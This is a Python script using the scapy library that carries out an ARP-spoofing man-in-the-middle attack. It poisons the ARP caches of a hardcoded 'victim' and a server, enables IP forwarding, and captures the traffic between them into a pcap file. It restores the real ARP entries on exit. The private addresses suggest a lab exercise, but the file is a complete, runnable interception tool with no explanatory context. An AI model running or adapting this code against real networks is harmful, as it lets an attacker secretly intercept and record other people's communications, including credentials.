from scapy.all import *
import argparse
import time
import os
import sys

def get_mac(ip, iface):
    #ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff', src=get_if_hwaddr(iface))/ARP(pdst=ip, hwdst='00:00:00:00:00:00'), timeout=3, verbose=0, iface=iface)
    target_mac = getmacbyip(ip, iface)
    return target_mac
    #if ans:
        #response_packet = ans[0][1]
        #return response_packet[ARP].hwsrc

def spoof(target_ip, host_ip, interface, verbose=True):
    # Get mac address of the target
    target_mac = get_mac(target_ip, interface)
    host_mac = get_mac(host_ip, interface)

    # Create an arp response
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')

    # Send packet
    send(arp_response, iface=interface, verbose=0)
    if verbose:
        self_mac = ARP().hwsrc
        print("[+] Sent to {} ({}) : {} ({}) is-at {}".format(target_ip, target_mac,  host_ip, host_mac, self_mac))

# Return real addresses to the victim, restore normal network process
def restore(target_ip, host_ip, interface, verbose=True):
    target_mac = get_mac(target_ip, interface)
    host_mac = get_mac(host_ip, interface)

    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")

    send(arp_response, verbose=0, count=10)
    if verbose:
        print("[+] Sent to {} ({}) : {} ({}) is-at {}".format(target_ip, target_mac, host_ip, host_mac, host_mac))

if __name__ == "__main__":
    # Enable ip forwarding
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    # Victim ip address
    target = "192.168.33.30"

    # Server ip address
    host = "192.168.33.20"

    # Network interface
    interface = "eth1"

    # Print info
    verbose = True

    # Create capture filter
    packet_filter = "host {} and host {}".format(target, host)
    
    # List to store captured packets
    captured_packets = []
    
    try:
        while True:
            # Capture packets
            batch = sniff(filter=packet_filter, count=20, iface=interface)
            captured_packets.extend(batch)

            # Perform ARP spoofing
            spoof(target, host, interface, verbose)
            spoof(host, target, interface, verbose)
            
            wrpcap("captured_packets.pcap", captured_packets)

            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(target, host, interface)
        restore(host, target, interface)
        print("Connection between server and client restored.\n")
